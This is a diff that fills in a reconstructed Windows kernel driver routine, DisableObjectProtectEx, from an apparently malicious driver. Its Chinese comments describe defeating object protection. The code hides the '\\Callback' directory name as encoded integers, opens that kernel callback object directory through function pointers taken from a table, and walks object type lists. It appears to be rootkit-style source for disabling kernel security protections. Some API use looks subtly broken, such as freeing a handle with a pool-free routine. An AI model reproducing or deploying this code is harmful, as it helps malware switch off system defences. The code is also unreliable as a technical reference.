@@ -87,9 +87,64 @@ char DisableObjectProtect(__int64 DeviceObject, __int64 Irp, _DWORD *OutputBuffe
 
 // DisableObjectProtectEx — 禁用对象保护扩展
 // 对应原始驱动 sub_140007D54
+// 从全局表取出 5 个已解析的例程指针（RtlInitUnicodeString / 打开对象 / 文件系统控制 / 关闭句柄 / 释放池），
+// 全部就绪时打开 \Callback 对象目录、下发 0xF000F 控制码取得其对象表，
+// 再以 0x100000 缓冲区遍历对象类型链表（WalkObjectTypeList）完成反保护
 char DisableObjectProtectEx(_DWORD *OutputBuffer, unsigned int BufferSize)
 {
-    // Uses device IOCTL to walk object types
+    void (__fastcall *InitUnicodeStringFunc)(PUNICODE_STRING, const wchar_t *);
+    NTSTATUS (__fastcall *OpenObjectFunc)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+    NTSTATUS (__fastcall *FsControlFileFunc)(HANDLE, ULONG, PVOID, ULONG, PVOID, ULONG);
+    void (__fastcall *CloseFunc)(HANDLE);
+    void (__fastcall *FreePoolFunc)(PVOID);
+    HANDLE DirectoryHandle;
+    HANDLE FileHandle;
+    void *WalkBuffer;
+    UNICODE_STRING DevicePath;
+    struct _OBJECT_ATTRIBUTES ObjectAttributes;
+    _DWORD EncodedName[5];
+
+    InitUnicodeStringFunc = (void (__fastcall *)(PUNICODE_STRING, const wchar_t *))GtRead(GtRtlInitUnicodeStringFunc);
+    OpenObjectFunc = (NTSTATUS (__fastcall *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES))GtRead(GtDeviceIoControlFunc);
+    FsControlFileFunc = (NTSTATUS (__fastcall *)(HANDLE, ULONG, PVOID, ULONG, PVOID, ULONG))GtRead(GtNtFsControlFileFunc);
+    CloseFunc = (void (__fastcall *)(HANDLE))GtRead(GtCloseHandleFunc);
+    FreePoolFunc = (void (__fastcall *)(PVOID))GtRead(GtExFreePoolFunc);
+
+    if (!InitUnicodeStringFunc || !OpenObjectFunc || !FsControlFileFunc || !CloseFunc || !FreePoolFunc)
+        return 0;
+
+    // 编码的宽字符串，解码后为 L"\\Callback"（内核回调对象目录）
+    EncodedName[0] = 4391004;
+    EncodedName[1] = 7077985;
+    EncodedName[2] = 6422636;
+    EncodedName[3] = 6488161;
+    EncodedName[4] = 107;
+    InitUnicodeStringFunc(&DevicePath, (const wchar_t *)EncodedName);
+
+    ObjectAttributes.Length = 48;
+    ObjectAttributes.RootDirectory = NULL;
+    ObjectAttributes.ObjectName = &DevicePath;
+    ObjectAttributes.Attributes = 576;
+    ObjectAttributes.SecurityDescriptor = NULL;
+    ObjectAttributes.SecurityQualityOfService = NULL;
+
+    DirectoryHandle = NULL;
+    if (OpenObjectFunc(&DirectoryHandle, 1, &ObjectAttributes) >= 0)
+    {
+        FileHandle = NULL;
+        if (FsControlFileFunc(DirectoryHandle, 0xF000F, NULL, 0, &FileHandle, 0) >= 0)
+        {
+            WalkBuffer = ExAlloc(PagedPool, 0x100000);
+            if (WalkBuffer)
+            {
+                *(_QWORD *)WalkBuffer = (ULONG64)FileHandle;
+                WalkObjectTypeList((_QWORD **)WalkBuffer, 0x20000, OutputBuffer, BufferSize);
+                ExFree(WalkBuffer);
+            }
+            CloseFunc(FileHandle);
+        }
+        FreePoolFunc(DirectoryHandle);
+    }
     return 0;
 }
 
